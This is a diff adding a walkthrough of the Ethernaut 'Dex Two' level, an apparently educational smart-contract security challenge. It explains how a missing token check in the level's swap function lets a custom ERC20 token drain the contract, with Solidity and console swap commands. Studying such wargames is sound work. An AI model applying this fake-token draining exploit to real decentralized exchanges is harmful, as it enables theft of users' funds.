@@ -42,6 +42,7 @@ RINKEBY_PRIVATE_KEY= # Private key from the Rinkeby testnet account
  - [21. Denial](#21-denial)
  - [22. Shop](#22-shop)
  - [23. Dex](#23-dex)
+ - [24. Dex Two](#24-dex-two)
 
 ### 1. Hello Ethernaut
 
@@ -978,4 +979,152 @@ Finally, we just need to swap 45 `token1` to `token2` to leave the `token1` supp
 
 ```js
 swap(token2, token1, 45);
+```
+
+---
+
+### 24. Dex Two
+
+If we compare the `swap` method of the previous Dex contract and the current one, we can tell that there is one assertion missing in this one
+
+```sol
+require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
+```
+
+This means that we can transfer tokens from and to any address we want. So we can drain the founds of the contract sending tokens to our custom `ERC20` token.
+
+```sol
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract DexTwoToken is ERC20 {
+    constructor(uint256 initialSupply) ERC20("DexTwoToken", "DTT") {
+        _mint(msg.sender, initialSupply);
+    }
+}
+```
+
+After setting up our contract, we deploy it with 400 of initial supply and approve our contract to interact with this token in order to gain visibility of our balance. 
+
+Then we give 100 of our DexTwoTokens to DexTwo contract.
+
+Now let's see the current status
+
+<table> 
+  <thead>  
+    <tr> 
+      <th>DexTwo</th> 
+      <th>You</th>
+    </tr>  
+  </thead> 
+  <tbody>
+    <tr> 
+      <td>
+        <table>
+          <thead>  
+            <tr> 
+              <th>token1</th> 
+              <th>token2</th>
+              <th>DexTwoToken</th>
+            </tr>  
+          </thead> 
+          <tbody>
+            <tr>
+              <td>100</td> <td>100</td> <td>100</td>
+            </tr>
+          </tbody>
+        </table>
+      </td>
+      <td>
+      <table>
+          <thead>  
+            <tr> 
+              <th>token1</th> 
+              <th>token2</th>
+              <th>DexTwoToken</th>
+            </tr>  
+          </thead> 
+          <tbody>
+            <tr>
+              <td>10</td> <td>10</td> <td>300</td>
+            </tr>
+          </tbody>
+        </table>
+      </td> 
+    </tr>
+  </tbody>  
+</table>
+
+Approve the contract to operate your tokens
+
+```js
+contract.approve(instance, 100000000)
+```
+
+Repeat the variables and methods assiganation from the previous level to make them syntactically cleaner
+
+```js
+const token1 = await contract.token1();
+const token2 = await contract.token2();
+const token3 = '<your_custom_token>';
+const balance = contract.balanceOf;
+const swap = contract.swap;
+```
+
+Let's start swaping 100 tokens from `token3` to `token1`
+
+```js
+swap(token3, token1, 100)
+```
+
+Balances now
+
+<table> 
+  <thead>  
+    <tr> 
+      <th>DexTwo</th> 
+      <th>You</th>
+    </tr>  
+  </thead> 
+  <tbody>
+    <tr> 
+      <td>
+        <table>
+          <thead>  
+            <tr> 
+              <th>token1</th> 
+              <th>token2</th>
+              <th>DexTwoToken</th>
+            </tr>  
+          </thead> 
+          <tbody>
+            <tr>
+              <td>0</td> <td>100</td> <td>200</td>
+            </tr>
+          </tbody>
+        </table>
+      </td>
+      <td>
+      <table>
+          <thead>  
+            <tr> 
+              <th>token1</th> 
+              <th>token2</th>
+              <th>DexTwoToken</th>
+            </tr>  
+          </thead> 
+          <tbody>
+            <tr>
+              <td>110</td> <td>10</td> <td>200</td>
+            </tr>
+          </tbody>
+        </table>
+      </td> 
+    </tr>
+  </tbody>  
+</table>
+
+And finnally we can drain the token2 balance of the contract by doing
+
+```js
+await contract.swap(token3, token2, 200)
 ```
